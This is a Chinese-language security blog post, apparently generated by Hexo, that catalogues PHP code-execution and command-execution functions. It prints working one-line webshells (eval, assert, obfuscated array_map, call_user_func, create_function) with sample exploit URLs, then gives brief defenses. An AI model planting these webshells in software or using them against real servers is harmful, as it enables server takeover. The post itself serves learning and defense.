@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="php代码执行与命令执行代码执行eval()— 把字符串作为PHP代码执行 1234#例:一句话木马&amp;lt;?php@eval($_GET[&quot;cmd&quot;]);?&amp;gt;  利用方式： 1234567891011121314151617181. shell.php?cmd=phpinfo();#文件上传条件竞争可利用此方式来创建文件2. shell.php?cmd=fputs(fopen(&apos;test.">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代码执行与命令执行">
+<meta property="og:url" content="https://yingyingguaier.github.io/2019/01/06/php代码执行与命令执行/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="php代码执行与命令执行代码执行eval()— 把字符串作为PHP代码执行 1234#例:一句话木马&amp;lt;?php@eval($_GET[&quot;cmd&quot;]);?&amp;gt;  利用方式： 1234567891011121314151617181. shell.php?cmd=phpinfo();#文件上传条件竞争可利用此方式来创建文件2. shell.php?cmd=fputs(fopen(&apos;test.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/php/php_fun_CodeAndOrder/001.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.112Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php代码执行与命令执行">
+<meta name="twitter:description" content="php代码执行与命令执行代码执行eval()— 把字符串作为PHP代码执行 1234#例:一句话木马&amp;lt;?php@eval($_GET[&quot;cmd&quot;]);?&amp;gt;  利用方式： 1234567891011121314151617181. shell.php?cmd=phpinfo();#文件上传条件竞争可利用此方式来创建文件2. shell.php?cmd=fputs(fopen(&apos;test.">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/php/php_fun_CodeAndOrder/001.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2019/01/06/php代码执行与命令执行/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>php代码执行与命令执行 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2019/01/06/php代码执行与命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php代码执行与命令执行
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-06 20:35:09" itemprop="dateCreated datePublished" datetime="2019-01-06T20:35:09+08:00">2019-01-06</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/整理/" itemprop="url" rel="index"><span itemprop="name">整理</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="php代码执行与命令执行"><a href="#php代码执行与命令执行" class="headerlink" title="php代码执行与命令执行"></a>php代码执行与命令执行</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>— 把字符串作为PHP代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> shell.php?cmd=phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件上传条件竞争可利用此方式来创建文件</span></span><br><span class="line"><span class="number">2.</span> shell.php?cmd=fputs(fopen(<span class="string">'test.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[test])?&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = @(string)$_GET[<span class="string">"cmd"</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'$cmd="'</span> . addslashes($cmd) . <span class="string">'";'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3.</span> shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"echo \"hello "</span> . $_GET[<span class="string">'cmd'</span>] . <span class="string">"\";"</span>;</span><br><span class="line"><span class="keyword">eval</span>($cmd);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4.</span> $&#123;$&#123;&#125;&#125;</span><br><span class="line">shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>— bool assert ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] )</p>
+<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@assert($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="preg-replace-‘-e’"><a href="#preg-replace-‘-e’" class="headerlink" title="preg_replace + ‘/e’"></a>preg_replace + ‘/e’</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<p>preg_replace ( $pattern , $replacement , $subject )</p>
+<p>preg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。</p>
+<p>代码执行条件：</p>
+<ol>
+<li><p>magic_quotes_gpc=Off时，导致代码执行。</p>
+</li>
+<li><p>pattern参数中注入/e选项</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$regexp = $_GET[<span class="string">'reg'</span>];</span><br><span class="line">$var = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>, <span class="string">'\\1'</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#利用方式 reg=%3C\/php%3E/e 即reg=&lt;\/php&gt;/e</span></span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当replacement 参数构成一个合理的php 代码字符串的时候</span></span><br><span class="line"><span class="comment">#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行</span></span><br><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"//e"</span>, $_GET[<span class="string">'cmd'</span>], <span class="string">"cmd test"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">shell.php?cmd=phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'h'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">h=[php]phpinfo()[/php]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/php/php_fun_CodeAndOrder/001.png" alt="001"></p>
+<p>php5.5以后用’’’preg_replace_callback’’’代替’’’preg_replace’’’的/e模式来处理正则执行替换</p>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><p>array_map — 为数组的每个元素应用回调函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'test'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>shell.php?test=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func ( <a href="http://php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> <code>$callback</code> [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$parameter</code> [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$...</code> ]] )</p>
+<p>call_user_func — 把第一个参数作为回调函数调用</p>
+<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> call_user_func(<span class="string">'assert'</span>, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h3><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组</span></span><br><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> call_user_func_array(<span class="string">'assert'</span>, <span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>]));<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>create_function - 创建一个匿名（lambda样式）函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例:一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> preg_replace_callback(<span class="string">'/.+/i'</span>, create_function(<span class="string">'$arr'</span>, <span class="string">'return assert($arr[0]);'</span>),$_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>php中其他包含回调函数参数的函数也有潜力</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>string system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
+<p>$command:要执行的命令。</p>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>string exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>
+<p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>直接将结果输出到游览器,不返回任何值</p>
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><p>resource popen ( string <code>$command</code> , string <code>$mode</code> )</p>
+<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p>类似 <a href="http://php.net/manual/zh/function.popen.php" target="_blank" rel="noopener">popen()</a> 函数.但提供了更加强大的控制程序执行的能力。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>尽量不要执行外部命令</p>
+</li>
+<li><p>使用自定义函数或函数库来替代外部命令的功能</p>
+</li>
+<li><p>使用escapeshellarg函数来处理命令参数</p>
+</li>
+<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>
+</li>
+</ol>
+<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“””，替换成“&quot;”，分号“;”替换成“;”</p>
+<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内</p>
+<p>safe_mode = On</p>
+<p>safe_mode_exec_dir = /usr/local/php/bin/</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/09/拒绝服务攻击/" rel="prev" title="拒绝服务攻击">
+                <i class="fa fa-chevron-left"></i> 拒绝服务攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/05/Web基础知识/" rel="next" title="Web基础知识">
+                Web基础知识 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php代码执行与命令执行"><span class="nav-number">1.</span> <span class="nav-text">php代码执行与命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码执行"><span class="nav-number">1.1.</span> <span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.1.2.</span> <span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace-‘-e’"><span class="nav-number">1.1.3.</span> <span class="nav-text">preg_replace + ‘/e’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map"><span class="nav-number">1.1.4.</span> <span class="nav-text">array_map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.1.5.</span> <span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func-array"><span class="nav-number">1.1.6.</span> <span class="nav-text">call_user_func_array</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function"><span class="nav-number">1.1.7.</span> <span class="nav-text">create_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">1.2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-number">1.2.1.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">1.2.2.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-number">1.2.3.</span> <span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-number">1.2.4.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#popen"><span class="nav-number">1.2.5.</span> <span class="nav-text">popen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-open"><span class="nav-number">1.2.6.</span> <span class="nav-text">proc_open</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">1.3.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
